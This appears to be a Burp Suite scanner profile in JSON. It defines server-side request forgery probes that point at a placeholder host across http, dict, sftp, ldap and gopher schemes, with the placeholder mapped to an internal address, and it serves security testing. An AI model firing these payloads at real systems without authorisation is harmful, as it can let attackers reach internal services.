[{"Name":"Custom_SSRF","Enabled":true,"Scanner":1,"Author":"ayadi","Payloads":["http://{custom_host}","dict://{custom_host}","sftp://{custom_host}","ldap://{custom_host}","gopher://{custom_host}","http://////////////{custom_host}","http://{custom_host}/SSRF_ATTACK_FROM_BurpSuit"],"Encoder":[],"UrlEncode":false,"CharsToUrlEncode":"","Grep":[],"Tags":["All","SSRF"],"PayloadResponse":false,"NotResponse":false,"TimeOut":"","isTime":false,"contentLength":"","iscontentLength":false,"CaseSensitive":false,"ExcludeHTTP":false,"OnlyHTTP":false,"IsContentType":false,"ContentType":"","NegativeCT":false,"IsResponseCode":false,"ResponseCode":"","NegativeRC":false,"isurlextension":false,"NegativeUrlExtension":false,"MatchType":1,"RedirType":0,"MaxRedir":0,"payloadPosition":1,"payloadsFile":"","grepsFile":"","IssueName":"Server side request forgery","IssueSeverity":"High","IssueConfidence":"Certain","IssueDetail":"","RemediationDetail":"","IssueBackground":"","RemediationBackground":"","Header":[{"type":"Payload","match":"{custom_host}","replace":"10.8.4.195:9000","regex":"String"}],"VariationAttributes":[],"InsertionPointType":[18,65,32,36,7,1,2,6,33,5,35,34,64,0,3,4,37,127,65,32,36,7,1,2,6,33,5,35,34,64,0,3,4,37,127],"Scantype":0,"pathDiscovery":false}]
